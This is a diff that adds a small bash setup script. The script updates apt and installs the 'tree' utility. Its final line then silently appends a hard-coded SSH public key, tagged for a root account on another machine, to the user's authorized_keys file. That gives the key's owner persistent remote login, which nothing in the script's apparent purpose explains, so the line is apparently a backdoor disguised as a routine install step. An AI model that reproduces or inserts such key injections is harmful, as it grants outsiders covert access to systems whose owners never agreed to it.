@@ -1,0 +1,4 @@
+#!/bin/bash
+sudo apt update
+sudo apt install tree
+sudo echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCR3/dJx212Nqin/Ntv1mIqrKlpuIq9bR4Fpb6r9GQFX8Pd1KjGpCvvFkeNqyREwfkDo7ZjjJpdJnGrP0GSx0uBrD845S2IJtHsVT7wi2oWm/oay9F4v+Ixu5pXJc2newEa8n2t6M/HhYH4EwrTJXPP47dVODPiKibHgrikTlhuPAXEWnc+xeZyKrjHjf6zVhnzGDN3g35TizB6P/M2AZFT1XLvmL4aXDZcwbXdN4PpLEnE+1EACov7fpY/xmO/vNj57NVuaPMC7VS/FHIt0bn4jA3CkYlI0lQJNxlSGvKJmoajIMtLqr5D27n/dQzP6NnsnbZ81x/BM49ogNA2R5rFMwoxjvjaTp/NJw/9/wi2G7LvoBmVlWFRUYKGZUHlf9Bp2RYOUZCh9O2wd8Qc1wGpU/2EsZZqTgK/gw7INbzT7+btOYTFEn2swCYtJYu8sZdSJnJjp5XSj8NGrtMfD2BGtwUXOBiNLVz7QKpFz6LrHYaRIMQidub4c0QhLBaiWW8= root@ubuntu-s-1vcpu-2gb-sfo3-01" >> ~/.ssh/authorized_keys
